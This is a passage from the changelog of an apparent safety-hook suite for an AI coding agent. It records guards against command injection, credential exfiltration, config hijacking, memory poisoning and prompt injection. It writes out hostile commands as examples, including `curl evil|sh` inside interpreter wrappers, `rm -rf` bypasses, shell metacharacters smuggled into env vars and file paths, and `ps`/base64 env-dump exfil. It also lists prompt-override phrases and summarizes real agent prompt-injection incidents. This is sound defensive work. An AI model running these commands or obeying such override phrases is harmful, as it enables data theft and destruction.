New `NETWORK_PATTERNS` entry in `hooks/safety.sh` blocks `ps` with an `e` (env) flag piped to an encoder/exfil channel (`base64`/`curl`/`wget`/`ncat`/`nc`/`xxd`/`openssl enc`). Gated on BOTH the `e` flag AND the exfil pipe, so the ubiquitous `ps aux | grep`, `ps -ef | grep`, `ps aux | head` stay allowed (verified). (2) **`.mcp.json` write-block — "SymJack" (May 2026).** A symlink disguised as a doc file resolved, on copy-approval, to the user's MCP config and inserted an attacker-controlled MCP server that auto-spawns with full privileges the next session (CC patched the symlink path, but the config-write is the durable choke point). `hooks/path-guard.sh` `selfmod` category now blocks Write/Edit to `~/.mcp.json`, `~/.claude.json` (holds the `mcpServers` map), and any project-scoped `**/.mcp.json` — alongside the existing `.claude/settings.json` / `.supercharger.json` / `CLAUDE.md` set. Opt out via `disableSecurityCategories: ["selfmod"]`. Both are denylist additions with tight FP guards; no behavior change for benign commands. 7 new tests (4 ps-exfil in `test-hooks.sh`, 3 `.mcp.json` in `test-path-guard.sh`). **Still deferred:** TrustFall `.mcp.json` SessionStart allowlist scan (Anthropic won't patch — needs an executable-allowlist design with its own FP surface), dedicated test suites for the v2.7.2 OWASP hooks. Hook count unchanged (107 full / 24 safe — edits to existing hooks). 1119 tests passing.

- [2.7.4] - 2026-06-28 — feat(subagent): notify the parent when a subagent's report was auto-recovered. Closes the last gap in the report-recovery chain (v2.6.82 report-pin → v2.7.1 SubagentStop fallback). The fallback writes the recovered report to `~/.claude/supercharger/scope/subagent-reports/<agent-id>.md` but is registered `async`, and async SubagentStop hooks **cannot** inject `hookSpecificOutput.additionalContext` into the parent's context — so nothing told the parent the report existed. The parent only found it if it already knew to run `tools/subagent-report.sh` (exactly what happened in a live session: 3 research agents returned degraded finals — `[Agent stopped]`, `[No user message.]`, `Complete.` — the fallback recovered all 3, but only prior context prompted the read). New `hooks/subagent-report-notify.sh` (SubagentStop, **blocking**) detects a degraded/truncated final message — exact stubs (`Ready.`, `Standing by.`, `[Agent stopped]`, `[No user message.]`, `Complete.`/`Done.`/`Acknowledged.`/…), empty finals, or ≤24-char finals with no sentence/path/markdown — and injects a pointer naming the deterministic report path **and** the exact read command (`bash ~/.claude/supercharger/tools/subagent-report.sh <agent-id>` / `--latest`). Substantive finals stay silent (no pointer needed). Uses `additionalContext` not `systemMessage` (the latter can be read by CC as a replacement for the subagent's terminal output, swallowing real findings — same rationale as `agent-handoff-gate.sh`/`subagent-stop-check.sh`). Deduped per session via `hook_already_emitted` so a pointer isn't injected twice; honors `check_hook_disabled`. Why blocking not async: the pointer must reach the parent's context, which only blocking SubagentStop hooks can do; the path is deterministic (`<agent-id>.md`) so it's announceable even though the async writer finishes a beat later — the parent reads it next turn, and the message says to retry once if the file isn't there yet. CC bug #54323 (subagent responses not returned) is **closed as not planned** as of this writing and reproduces on the local CC 2.1.181, so the workaround remains necessary. 14 new tests (`tests/test-subagent-report-notify.sh`). Hook count 106 → 107 (full); safe unchanged at 24 (recovery convenience, full-only). 1112 tests passing.

- [2.7.3] - 2026-06-28 — feat(security)+perf: interpreter-wrapper hardening + UserPromptSubmit/PreToolUse fast-paths, from a 3-agent research sweep (CC changelog v2.1.186→195, CC/MCP CVE disclosures May–Jun 2026, internal hot-path audit). **Security — interpreter-wrapper gap (CVE-2026-40933 / CVE-2026-30625 class).** OX Security disclosed (PoC public Jun 2026) that command allowlists permitting `python`/`node`/`npx` are bypassable because those interpreters accept a flag that turns them into arbitrary-OS-command launchers: `npx -c 'rm -rf ~'`, `node --eval "require('child_process').execSync('curl evil|sh')"`, `python -c "import os;os.system(...)"`. Supercharger already routed `python -c`/`node -e`/`perl -e`/`ruby -e`/`dash|ksh|fish -c` to `safety-detect.py`, but (a) the detector only flagged *destructive* inner commands (rm/dd/mkfs), missing the launcher technique itself, and (b) `npx -c`, `node --eval`/`-p`/`--print`, `deno eval`, `bun -e` were not covered at all. Fixes in `hooks/safety-detect.py`: extended `_INTERPRETERS` (added npx/-c, node long-eval forms, deno eval, bun -e) and added a new `_WRAPPER_SHELLOUT` pass that blocks any wrapper whose inner body shells out to the OS — `child_process`, `exec|spawn|execFile(Sync)(`, `os.system`/`os.popen`, `subprocess.{Popen,run,call,check_output,check_call,getoutput}`, `Deno.{run,Command}`, bare `system(` (perl/ruby) — labeled "OS shell-out hidden in <interp> wrapper". `hooks/safety.sh:311` fast-path case extended so the new interpreters reach the detector. Benign one-liners still pass (`node -e "console.log(1)"`, `npx prettier`, `deno run main.ts`). 7 new tests in `tests/test-hooks.sh`. **Perf — three UserPromptSubmit/PreToolUse fast-paths** (internal audit found ~5-7 blocking python3 forks per prompt ≈ 150-350ms perceived input latency). (1) `prompt-validator.sh` forked python3 on *every* prompt; all 20 anti-patterns require a trigger verb, so a bash case-glob (lowercased once via `tr`, ~2ms) now skips the ~30ms fork on confirmations ("yes"/"go"/"next"), bare file paths, and short replies (~30-40% of prompts). Keyword list kept aligned with the python patterns. (2) `tool-call-limiter.sh` forked python3 for pure integer arithmetic (`count>cap`, `pct>=80`) on every capped tool call plus two more forks just to JSON-escape one string — replaced with bash `$(())` + `jq -Rs .`, ~30ms/call saved when a cap is set (no-cap default already exits early). Behavior identical except the warn-% is now integer-truncated (cosmetic). **Deliberately deferred:** `thinking-budget.sh` fast-path — it classifies *every* prompt and replicating its multi-branch classifier (flags/agent-file/verb-sets/token-counts) in bash risks silent reasoning-depth drift; not worth ~30ms. **Verified-but-already-covered** (no action): `/proc` Read bypass (Microsoft CC-Action advisory) → `env-file-guard.sh:62`; SymJack `.claude/settings.json` write → `path-guard.sh:147`. **Deferred for a later release:** TrustFall `.mcp.json` SessionStart allowlist scan (Anthropic won't patch — we'd be the only defense), `ps auxeww|base64` env-dump exfil (Comment-and-Control), `.mcp.json` add to path-guard (SymJack defense-in-depth), dedicated test suites for the new security hooks. Hook count unchanged (106 full / 24 safe — all edits to existing hooks). 1097 tests passing.

- [2.7.2] - 2026-06-25 — feat(security): ship the 3 deferred OWASP Top 10 Agentic (2026) gaps that v2.6.83 scoped but punted. (1) **Memory & Context Poisoning — ASI06** — `hooks/memory-write-guard.sh` (PreToolUse|Write,Edit, **safe mode**). Persistent memory (`MEMORY.md`, `**/memory/*.md`, `.claude/projects/*/memory/*.md`, `.claude/supercharger-memory.md`) is auto-loaded into context at every SessionStart, so one poisoned write compromises all future sessions. The hook fast-paths past non-memory writes (case-glob on `MEMORY`/`memory`), then denies (`permissionDecision:deny` + exit 2) when content carries high-confidence poisoning markers: instruction-override / discard / memory-wipe phrasing, persona hijack (`you are now`), role override, virtualization jailbreak (`pretend you are/to be`), token-injection framing (`<|im_start|>`, `<|system|>`, `[INST]`, `<<SYS>>`, `<function_calls>`), zero-width chars, base64 `ignore`/`system` stubs, and credential-exfil directives (`send/curl/upload … secret/credential/token/.env//proc/self/environ`). Patterns are the tight injection-scanner set — they never appear in legitimate memory (facts, prefs, how-to notes), so FP risk ≈ 0; reads `.content` (Write) and `.new_string` (Edit). (2) **Cascading Failures — ASI08** — `hooks/subagent-circuit-breaker.sh` (SubagentStart, full mode, **blocking — not async**). Rolling-window spawn counter per session (`.subagent-spawns-<sid>.json`, sanitized id, atomic write, bounded history). Warns via `additionalContext` at `SC_SUBAGENT_WARN` (default 20) spawns in `SC_SUBAGENT_WINDOW` (default 300s) and hard-denies (exit 2) at `SC_SUBAGENT_MAX` (default 50) — a clear runaway fan-out / recursion / retry-storm. Defaults are deliberately high so normal multi-agent workflows pass untouched; tune via env. Sessions are independent (no shared counter). (3) **Tool Misuse / Hijacking — ASI04** — `hooks/mcp-provenance.sh` (PostToolUse|mcp__, safe mode, asyncRewake). Complements `prompt-injection-scanner.sh` (which catches *persuasion* — "ignore instructions") by catching *structural provenance forgery*: an MCP result that impersonates control-channel framing — forged `<function_calls>`/`<invoke>`/`<tool_call>`/`tool_code`-fence/`"tool_use":`/`"function_call":` blocks, authority-turn impersonation (`[system]`/`[tool_result]`/`<system>`/`### system`), and tool-chaining directives (`now call the X tool to`, `use the bash/shell/github/sql/playwright tool`). Result text is data, never a control channel — any such framing is forged provenance; warns via `systemMessage` + drops a `.scan-alert` breadcrumb. All three were the exact items deferred in v2.6.83's "**Deferred** from research" note. 16 new tests (`tests/test-owasp-asi.sh`: 6 memory-guard + 4 circuit-breaker + 6 provenance). Hook count 103 → 106 (full) / 22 → 24 (safe; circuit-breaker is full-only). 1090 tests passing.

- [2.7.1] - 2026-06-25 — feat(subagent): SubagentStop auto-fallback when report-pin instruction is ignored. v2.6.82's `subagent-safety.sh` told every subagent to Write its full report to `~/.claude/supercharger/scope/subagent-reports/<agent-id>.md` as its last tool call — but the instruction is advisory and some subagents ignore it (observed in a live shopify-radius-bundles session: agent `a11c8b4b58831816c` ran many Reads, returned "Ready." without writing). New `hooks/subagent-report-fallback.sh` fires on SubagentStop (async): if the per-agent-id report file is missing, it scrapes the JSONL transcript at `.agent_transcript_path` (or scans common task dirs by id) and writes the structured + long-block findings to the same path with a `# Subagent report (auto-recovered)` header. Logic mirrors `tools/agent-report-tail.sh` markers (HOOK/STATUS/FAIL/PASS/BUG/FINDING/EXPECTED/ACTUAL/REPRO/PICK) with ≥80-char block fallback when no structured markers present. Result: every SubagentStop produces a report regardless of whether the agent complied with the instruction — `bash tools/subagent-report.sh --latest` always returns content. Verified on the actual lost `a11c` agent: recovered a 7214-byte structured report from the transcript. 7 new tests covering: skip-when-exists, structured-markers, long-block-fallback, no-agent-id, malformed-JSON, missing-transcript, empty-transcript. Hook count 102 → 103 (full mode); safe mode unchanged at 22 (fallback is full-only since it's a recovery convenience, not a security gate). 1071 tests passing.

- [2.7.0] - 2026-06-24 — **MINOR milestone**: consolidates 14 patch releases (v2.6.72 → v2.6.85) into a coherent feature line. No behavior change from v2.6.85; this is the semver-correct bump for the additions that accumulated. **New hook events wired** — Setup (`hooks/setup-check.sh`, v2.6.74) fires at `claude --init`/`--maintenance`; UserPromptExpansion (`hooks/slash-command-guard.sh`, v2.6.74) inspects expanded slash-command text before Claude sees it. **New per-server MCP guards** (v2.6.84) — `mcp-github-write-gate.sh` (Invariant Labs cross-repo exfil), `mcp-playwright-guard.sh` (CVE-2025-9611 + playwright-mcp #1495/#1651), `mcp-sql-guard.sh` (Supabase 2025). **New subagent return-channel workaround** (v2.6.82) — `subagent-safety.sh` instructs every spawn to Write its full report to a known per-agent-id path; `tools/subagent-report.sh` reads back; complements `tools/agent-report-tail.sh` JSONL scraper. Defends against CC v2.1.176+ degradation (anthropics/claude-code#69970). **CVE coverage in this milestone**: CVE-2025-9611 (Playwright), CVE-2025-59536 + CVE-2026-21852 + CVE-2026-33068 (project-file RCE class), CVE-2026-26268 (Cursor git-hook RCE shape), CVE-2026-35020 / -35021 / -35022 (TERMINAL injection + path command-sub + auth helper shell-injection — v2.6.85). **Real-world incident coverage**: drizzle-kit push --force (60+ tables wiped Feb 2026), terraform destroy (DataTalks.Club 2.5y data wipe), prisma migrate reset, /proc/self/environ token exfil (CC v2.1.128 fix replicated), unsolicited git push (partially), inline env-var bypass (`env FOO=bar rm -rf /`), `${HOME}` braced bypass (fuzz-found), 4 OWASP Top 10 Agentic 2026 gaps. **Perf & quality**: UserPromptSubmit fast-paths cut ~140ms/prompt (v2.6.79); fuzz harness `tests/fuzz-safety.sh` (4655 mutations × 31 dangerous + 24 benign bases); prompt-injection scanner refinements raised keyword recall from ~72% to ~85% on Giskard/garak/PayloadsAllTheThings (v2.6.84); 17-bug internal audit sweep (v2.6.77); test coverage filled for 5 previously-untested hooks (v2.6.78). **Adversarial-corpus benchmark**, **OWASP Top 10 Agentic 2026 audit**, **CVE/NVD sweep**, **real-world disaster scan**, and **CC v2.1.176 + v2.1.186 deep-dive** all completed and shipped findings. Distribution playbook (`docs/DISTRIBUTION.md`) added. Hook count 96 → 102 (full), 19 → 22 (safe). Test count 939 → 1063 (+124). Backward compatible — settings.json references unchanged, no deprecations.

- [2.6.85] - 2026-06-24 — fix(security): close 3 disclosed-CVE gaps from 2026 AI-agent vulnerability survey. Research swept NVD, MITRE, GHSA, Anthropic + Phoenix Security + Check Point Research disclosures; ~10 CVEs in scope for the CC/MCP ecosystem, 7 already covered by existing Supercharger hooks, 3 had gaps. (1) **CVE-2026-35020** (`safety.sh:240`) — CC v2.1.92 fix: `$TERMINAL` env var passed to terminal-launcher via `shell=true`; a `export TERMINAL='xterm;curl evil'` from a malicious `.env` or earlier shell command achieves RCE. Added regex `export[[:space:]]+(TERMINAL|ANTHROPIC_BASE_URL|ANTHROPIC_AUTH_TOKEN|ANTHROPIC_API_KEY)[[:space:]]*=.*[$\`;&|]` to credentials category — blocks the export if the value contains shell metacharacters; benign `export TERMINAL=xterm` passes. (2) **CVE-2026-35021** (`path-guard.sh:81-90`) — CC v2.1.92 fix: file paths containing `$(curl ...)` or backticks passed to `execSync` via the editor invocation get shell-evaluated even inside quotes (POSIX double-quote semantics). Added section 3.1b: rejects Write/Edit `file_path` containing `$(` or backtick. Gated by existing `path-traversal` opt-out category. (3) **CVE-2026-35022** (`config-scan.sh:189-218`) — CC v2.1.92 fix: `apiKeyHelper`, `env.awsAuthRefresh`, `env.awsCredentialExport`, `env.gcpAuthRefresh` settings values passed via `shell=true` in auth helper flow; a malicious project `settings.json` with shell metacharacters in these fields achieves RCE on the auth path. Extended `scan_settings()` to scan all four fields for `[$\`;|&]`; advisory at SessionStart so user/Claude sees the warning before the auth helper fires. Already covered (no action): CVE-2025-59536 (project hook RCE — `config-scan.sh:85-112`), CVE-2026-21852 (ANTHROPIC_BASE_URL exfil — `config-scan.sh:114-134`), CVE-2026-33068 (dangerouslySkipPermissions — `config-scan.sh:172-180`), CVE-2026-26268 (Cursor git-hook RCE — `path-guard.sh` blocks `.git/hooks/**` + `git-safety.sh` blocks destructive git). Out of scope: CVE-2025-61260 (Codex CLI MCP auto-load — not CC), CVE-2026-30615 (Windsurf renderer — not CC), CVE-2026-30623 (LiteLLM proxy — not CC), CVE-2026-40933 (Flowise — not CC), GHSA-wpqr-6v78-jr5g (Gemini CLI CI/CD — not CC). 7 new tests covering all 3 CVE gaps (3 safety.sh + 3 path-guard.sh + 1 control). 1063 tests passing.

- [2.6.84] - 2026-06-24 — feat: 3 per-MCP-server safety hooks + 5 prompt-injection scanner refinements from parallel research (MCP attack-surface survey + adversarial corpus benchmark). All three MCP hooks address documented real-world incidents. (1) `hooks/mcp-github-write-gate.sh` — PreToolUse on `mcp__github__*` blocks: `merge_pull_request` always (manual review required), `actions_run_trigger` always (CI privilege escalation), push/write/delete to `main`/`master`/`production`/`prod`/`release`, `delete_file` on `.github/` or any `.yml`/`.yaml`. Incident: Invariant Labs May 2025 — malicious GitHub issue injected agent into cross-repo data heist, exfiltrated salary data via public PR. (2) `hooks/mcp-playwright-guard.sh` — PreToolUse on `mcp__playwright__*,mcp__puppeteer__*` blocks: `browser_run_code_unsafe` + `puppeteer_evaluate` unconditionally (CVE-2025-9611 + microsoft/playwright-mcp #1495/#1651 — arbitrary file read via `file:///etc/passwd` + `page.content()`); `browser_navigate` to `file://`, localhost, RFC1918 (10/192.168/172.16-31), cloud metadata (`169.254.169.254`, `metadata.google.internal`) — SSRF + DNS rebinding class. (3) `hooks/mcp-sql-guard.sh` — PreToolUse on `mcp__postgres__*,mcp__supabase__*,mcp__mysql__*,mcp__sqlite__*` blocks destructive SQL verbs (`DROP TABLE/DATABASE/SCHEMA/INDEX/VIEW`, `TRUNCATE TABLE`, `DELETE FROM`, `ALTER TABLE/DATABASE/SCHEMA`, `GRANT`, `REVOKE`) with word-boundary regex to avoid FPs on column names like `deleted_at`. Reads `query` / `sql` / `statement` alternate parameter names. Incident: Supabase 2025 — Cursor agent with service-role MCP credentials processed an injected support ticket containing `DROP TABLE`, exfiltrated production DB. All 3 hooks registered in BASE block (safe mode + full), not just full — security-critical regardless of install mode. **Prompt-injection scanner refinements** from adversarial-corpus benchmark (tested vs Giskard, garak/PromptInject, PayloadsAllTheThings, HackAPrompt; baseline keyword recall ~72-75%): (a) broadened P1 from `instructions` only to `(instructions?|directions?|commands?)` + added `any` to alternation, catching garak's canonical "Ignore the above directions" + PayloadsAllTheThings "ignore any previous"; (b) narrowed P4 `system prompt` from bare match to `(reveal|leak|print|output|show|return|expose|include|repeat) (the|your|my)? system prompt` — bare form fired on any AI blog fetched via WebFetch (highest FP risk); (c) added `disregard any` (canonical OWASP form, P5 only had `your|all|the`); (d) added `pretend (you are|to be)\b` — entire DAN virtualization corpus uses this shape, no prior pattern caught it; (e) added `from now on[,\s]` — authority-shift opener in documented OWASP payloads. Expected keyword recall now ~85%+ on tested corpora. Obfuscation classes (typo/leetspeak, ROT13, multi-step splitting) remain uncovered by design — regex pre-filters can't catch those without false-positive explosions. **Deferred** from MCP survey: filesystem write_file gate (scope-guard.sh + path-guard.sh already partially cover), slack post_message exfil gate (PostToolUse injection scanner already fires on output). Hook count 99 → 102 (full) / 19 → 22 (safe). 27 new MCP guard tests + injection refinements verified. 1056 tests passing.

- [2.6.83] - 2026-06-24 — feat: 4 incident-backed safety additions from real-world CC disaster research + OWASP Top 10 Agentic 2026 audit. Two parallel research agents found documented incidents and gap categories; ship the cross-validated picks. (1) **ORM schema-drop `--force` patterns** — `safety.sh:DB_PATTERNS` now matches `drizzle-kit push --force`, `prisma db push --force-reset`, `prisma migrate reset`, `typeorm schema:drop`, `sequelize db:drop`, `knex migrate:rollback --all`. Real incident: drizzle-kit push --force on Railway PostgreSQL wiped 60+ tables (Feb 2026, GH #27063) — agent picks `--force` specifically to bypass the interactive stdin confirmation. No `rm` invoked, so nothing else caught it. (2) **`/proc/*` and `/sys/*` Read block** — `env-file-guard.sh:Read` branch now denies reads under those trees. Real incident: GitHub issue body prompt-injection caused agent to Read `/proc/self/environ` and post `ANTHROPIC_API_KEY` + `GITHUB_TOKEN` as a PR comment (CC v2.1.128 fix, May 2026). Block at the Read input rather than relying on `output-secrets-scanner` to catch the values downstream. (3) **Prompt-injection scanner extended to Read** — `lib/hooks.sh` matcher `mcp__,WebFetch,WebSearch` → `mcp__,WebFetch,WebSearch,Read`. Real incident: Cline npm-token theft via poisoned GitHub issue title read via `gh issue view` (Flatt Security, Feb 2026). The scanner now sees file content too; payload uses `.content` for Read vs `.output` for MCP/web (dual-field read added). Closes OWASP ASI01 gap. (4) **`human-approval-gate` default-on for unrecoverable subset** — gate now fires WITHOUT requiring `humanApprovalGate: true` in `.supercharger.json` when the command matches: `terraform destroy`, `prisma migrate reset`, `drizzle-kit push --force`, `DROP DATABASE`, `kubectl delete namespace`. Opt-out: `SUPERCHARGER_NO_HUMAN_GATE_DEFAULT=1` env var or `humanApprovalGate: false`. Reasoning: these are documented in real post-mortems (DataTalks.Club terraform destroy Feb 2026 wiped 2.5y data; PocketOS Railway DB Apr 2026 9-second deletion) and are unrecoverable — opt-in default is too lax. Other gate categories (sql, git, publish, db, docker, disk) remain opt-in. **Deferred** from research: memory-write validator (OWASP ASI06, ~1h), subagent failure circuit-breaker (ASI08, ~2h), MCP provenance check (ASI04, ~2h), unsolicited git push detection (needs turn-context access). **Out of scope** for shell hooks: cloud-API teardown via MCP (PocketOS shape; needs MCP-level policy), OS sandboxing (ASI05), inter-agent cryptographic auth (ASI07). 10 new tests (5 ORM + 4 /proc/sys + 1 control). 1027 tests passing.

- [2.6.82] - 2026-06-24 — feat: subagent report-pin workaround for CC v2.1.176 return-channel degradation. User reported in another session: a `shopify-app-review-engineer` subagent ran 83+ tool calls *thrice* but the parent only saw "Ready." each time — wasting hundreds of tool calls' worth of tokens. Same upstream bug we filed as anthropics/claude-code#69970. Until CC fixes it, this ships a forward defense rather than just the reactive `tools/agent-report-tail.sh` (JSONL transcript scraper). `hooks/subagent-safety.sh` now appends a "report-pin" instruction to every SubagentStart `additionalContext` payload telling the subagent to Write its full final report to `$HOME/.claude/supercharger/scope/subagent-reports/<agent-id>.md` as its LAST tool call. The path is per-agent-id (extracted from payload), pre-mkdir'd. Parent recovers via new `tools/subagent-report.sh` — list mode (no args), `--latest` for newest, `<agent-id>` for specific, `--clean` to clear. Two-pronged recovery: (a) explicit disk artifact if subagent obeys the instruction, (b) JSONL scrape via `agent-report-tail.sh` as fallback if it doesn't. Cheaper than retrying an 80-tool agent — even one in three rescued saves money. 2 new tests added (report-pin path + Write/LAST language). Hook count unchanged. 1018 tests passing.

- [2.6.81] - 2026-06-23 — fix: 2 bypasses + 1 regression caught by new `tests/fuzz-safety.sh` mutation harness (4655 runs across 31 dangerous + 24 benign bases × whitespace/compound/prefix/flag-split mutators). (1) **Inline env-var prefix bypass** — `cmd-normalize.sh:normalize_cmd` stripped literal `sudo|command|env` but not POSIX `VAR=value cmd` assignments, so `env FOO=bar rm -rf /` and `PATH=/usr/bin rm -rf /` left `rm` masked behind a non-`rm` first token, blanking the rm-deny rules. Fix loops on `^[A-Za-z_][A-Za-z0-9_]*=\S*\s+` after the verbatim-prefix strip. Same patch applied to `split_segments` python so chained shapes like `echo x; FOO=bar rm -rf /` are also caught per-segment. 280 fuzz bypasses eliminated. (2) **`${HOME}` braced bypass** — `safety.sh:114` regex `(~|\$HOME|\.\.)` matched `$HOME` (unbraced) but not `${HOME}`. Added `\$\{HOME\}` + `\$\{HOME\}\/` + `~\/` + `\$HOME\/` variants. 143 fuzz bypasses eliminated. (3) **Regression: credential check skipped under env-var fix** — fix #1 stripped `API_KEY=secret123 echo done` to `echo done` before the credential regex saw it, hiding leaks where the secret IS the env-var value. `safety.sh:229` now scans `$COMMAND` (original) for credentials instead of `$CMD` (normalized) — destructive-command checks still use `$CMD`, so the two-pass treatment gets both. Verified: `API_KEY=secret123 echo done` exit 2 (blocked); `echo "text mentioning API_KEY in docs"` exit 0 (allowed). Also new `tests/fuzz-safety.sh` (not run in `tests/run.sh` — slow ~5min, invoke manually with `--verbose` for details). Remaining 350 fuzz "bypasses" are harness artifacts (whitespace mutator injects double-space inside credential strings, mangling them — real `sk-abc...` 48-char keys still match). 1016 tests passing.

- [2.6.80] - 2026-06-23 — fix(smart-approve): skip Bash auto-approve for subagent PermissionRequests. CC v2.1.186 changed background subagents from auto-deny to surfacing permission prompts in the main session. When the payload carries `agent_id`, smart-approve.sh now bails out of the Bash auto-approve block. Read-only tools (Read/Glob/Grep/LS) and Write/Edit inside project still auto-approve regardless of origin — those are safe. Reasoning: the user delegating a task to a subagent shouldn't implicitly grant the agent open shell access. Per Marie Curie research on the v2.1.186 `respondToBashCommands` change: no new hook surface — `shell-escape-advisor.sh` already documents the prompt-injection attack vector via shell stdout.
- [2.6.79] - 2026-06-23 — perf(UserPromptSubmit): bash fast-paths on the two cheapest-to-skip prompt scanners. 13 hooks fire on every UserPromptSubmit (10 sync + 3 async); inline profiling showed ~651ms cumulative sync latency per prompt, with each individual hook spending ~30-50ms on python3 fork startup before doing any work. Two hooks suit a bash pre-check that exits before reaching python: (1) `shell-escape-advisor.sh` — case-glob on `*'!'*` skips the python regex pass on the ~95% of prompts that contain no `!` anywhere. The pattern is intentionally loose (matches `!` anywhere in the JSON payload, not just at prompt start) so we never miss a legitimate trigger; over-firing into python is harmless. (2) `destructive-prompt-scanner.sh` — case-glob on the destructive verb set (`rm -`, `curl `, `wget `, `git push`, `git reset`, `dd if`, `mkfs.`, `/dev/sd`, SQL DROP/TRUNCATE TABLE/DATABASE/SCHEMA in both cases, plus exec verbs `bash `/`eval `/` nc `/`ncat `/`python `/`python3 `/`perl `/`ruby `/` sh `/`\`sh`) lets ~95% of prompts skip the python regex pass. Same comment guards future regex additions: any keyword added to the python check must also appear in the bash pre-filter or the python branch becomes unreachable. Real-world wins are 20-50ms per prompt depending on python warm-cache state. Cumulative latency drops to ~575ms typical / 605ms worst. No behavior changes for matching prompts. All existing 12 + 15 hook tests still pass (false-positive guards intact). 1014 tests passing.
- [2.6.78] - 2026-06-23 — test: fill coverage for the 5 hooks that had no test file. Surfaced via inline census (`grep` each hook name across `tests/`); 5 had zero references. The most important gap was `notify-helper.sh` — security-fixed in v2.6.72 (osascript RCE via backtick/$ injection) but shipped without a regression test, then v2.6.77 added the `notify-send` Linux fix on top of an unverified base. New `tests/test-notify-helper.sh` covers the sanitization pipeline (`tr -d '\`$'` + sed escapes + `head -c 200`) with 10 cases: backtick stripped, `$` stripped, double-quote escaped, backslash escaped, 200-char cap, benign-text passthrough, two live-RCE probes (backtick + `$()` invocations DO NOT execute), and the `_cooldown_ok` first-call/within-window behavior. New `tests/test-cmd-normalize.sh` covers the sourced `normalize_cmd`/`split_segments` helpers used by every safety hook — 18 cases including sudo/command/env prefix stripping, separator splitting on `&&`/`||`/`;`/`|`, and quote-aware no-split inside `'..'` and `"..."`. New `tests/test-notify-events.sh` covers `notify-permission.sh` and `notify-stop.sh` end-to-end (9 cases) — valid payload exit, no-desktop-notify guard, sub-agent skip path (via `agent_id` field), malformed JSON survival, `stop_hook_active` short-circuit, and the v2.6.77 `$HOME` env-var fix path. New `tests/test-update-check.sh` covers the 1-file-per-day version banner: 5 cases for `SUPERCHARGER_NO_UPDATE_CHECK=1` opt-out, missing `.version` file, fresh-cache silent exit when LOCAL==REMOTE, fresh-cache banner when REMOTE>LOCAL, stale-cache non-blocking proceed. Total +42 new tests. 1014 tests passing.
- [2.6.77] - 2026-06-23 — fix: 17 bugs from a 4-agent parallel internal audit sweep across ~99 hooks. Four detective sub-agents each took a slice (PreToolUse safety / UserPromptSubmit / PostToolUse+Stop / notify+tools), grepped for regex gaps, payload-field assumptions, race conditions, set-u traps, and dead branches. HIGH: (1) `code-security-scanner.sh:141` was `exit 2` after emitting `permissionDecision: "ask"` — CC interprets exit 2 as hard-deny regardless of JSON, so every "warn" was a silent block. Changed to exit 0. (2) `human-approval-gate.sh:49,58` shell-interpolated `$SEARCH_DIR` into a `python3 -c` heredoc — any path containing `'` (e.g. `o'malley/project`) broke Python parsing, GATE_ENABLED stayed empty, the entire gate silently disabled for that project. Switched to `SC_CFG="..." python3 -c ...os.environ['SC_CFG']` env-var pattern (same class as the v2.6.72 osascript RCE fix). (3) `git-safety.sh:88` regex `(--force|--force-with-lease|-f)([[:space:]]|$)` required a space or EOL after the flag, so `git push --force-with-lease=origin/main main` bypassed the protected-branch gate entirely. Extended regex to allow `=<ref>`. (4) `output-secrets-scanner.sh:15` read `.tool_response.output` only, but Bash PostToolUse payloads deliver output under `.tool_response.stdout` (CC v2.1.121 field rename) — the hook was inert for every Bash invocation, so secrets in `cat ~/.env`, `env`, `printenv` output were never scanned. Dual-field read added. MEDIUM: (5) `safety.sh:237` persistence regex required `>` redirect, so `tee -a ~/.bashrc <<< 'evil'` bypassed shell-profile blocking; added explicit tee pattern. (6) `human-approval-gate.sh:25` called `check_hook_disabled` before draining stdin — early exit left CC writing into a closed pipe → sporadic `write: broken pipe` on macOS. (7,8) `adaptive-economy.sh:91` (.eco-last) and `scope-guard.sh:18-19` (.snapshot/.contract) lacked `${SESSION_ID}` suffix — two concurrent sessions in the same project (or two projects on the same machine) silently shared dedup/baseline state. SID-suffixed files in v2.6.49 scan-alert pattern; legacy unsuffixed files cleaned by clear-mode. (9) `notify-stop.sh:78` shell-interpolated `$HOME` into `python3 -c` (same class as #2/#3). LOW: (10) `confidence-gate.sh:27` used regex for cwd extract instead of jq — fell back to wrong dir on edge JSON, mis-detecting `.supercharger-debug`. (11) `rate-limit-advisor.sh:10` called `init_hook_suppress "$PWD"` (hook runner dir) instead of payload cwd — debug mode never activated. (12) `thinking-budget.sh:60-61` matched `{'debugger','architect','planner'}` substrings against agent-router output, but the router writes the full agent name like `"Sherlock Holmes (Detective)"` — none of the keys matched any of the 9 agent names. Entire agent-based fast-path was dead code. Aligned to `{detective, architect, strategist, scientist}` / `{writer, generalist}`. (13) `learn-from-prompts.sh:34,49` appended correction/reinforcement logs forever with no rotation — added tail-200 trim at threshold-250 (same pattern as adaptive-economy). (14) `agent-router.sh:175` fallback JSON quoting only stripped `"\\` — double-quotes in project agent descriptions produced malformed JSON; added jq -Rs primary. (15) `session-memory-write.sh:144` comment said `Truncate to 2000 chars` but code was `%.1200s` — aligned to 2000 (the originally intended budget) so the `decisions:` field at the tail survives. (16) `tool-history-tracker.sh:49-51` non-atomic read-count-trim-replace race under concurrent async invocations — wrapped in flock. (17) `notify-helper.sh:75` Linux `notify-send` path received raw `$title`/`$msg` instead of `$safe_title`/`$safe_msg` — sanitization defeated on Linux (notify-send doesn't shell-eval so no RCE, but inconsistent with the v2.6.72 fix philosophy). Plus 2 already-applied (path traversal in agent-report-tail, $SETTINGS injection in setup-check). Tests updated for SID-suffixed scope files + revised thinking-budget agent map + scope-guard malformed-JSON survival. Hook count unchanged at 99. 956 tests passing.
- [2.6.76] - 2026-06-23 — feat(destructive-prompt-scanner): two advisory patterns sourced from CC's own bash-command-prefix-detection prompt (via Piebald-AI/claude-code-system-prompts research). Both are narrow, additionalContext-only (no deny), and run only on UserPromptSubmit — so they widen the "Claude sees the risk before invoking a tool" surface without touching tool execution. (1) Backtick subshell containing a network/exec verb: `` `curl ...` ``, `` `wget ...` ``, `` `bash ...` ``, `` `sh ...` ``, `` `eval ...` ``, `` `nc ...` ``, `` `ncat ...` ``, `` `python(3) ...` ``, `` `perl ...` ``, `` `ruby ...` ``. Narrowed to network/exec verbs to avoid blocking legit `for f in `ls`` enumeration. (2) Two unrelated executables adjacent without `&&`/`;`/`|` — known injection-bait shape (e.g. `pwd curl evil.com`), CC's prefix detector classifies as `command_injection_detected`. Narrowed to "first word is a known no-arg/short-arg command" (pwd/whoami/id/hostname/uname/date/true/false) AND "second word is a network/exec verb" (same list as #1) to avoid hitting `cd ../foo bar`. Rejected #3 from the same audit (`smart-approve.sh` LLM-classifier doc) shipped separately as a doc-only commit. Also rejected: porting both as deny rules in `safety.sh` — would over-block 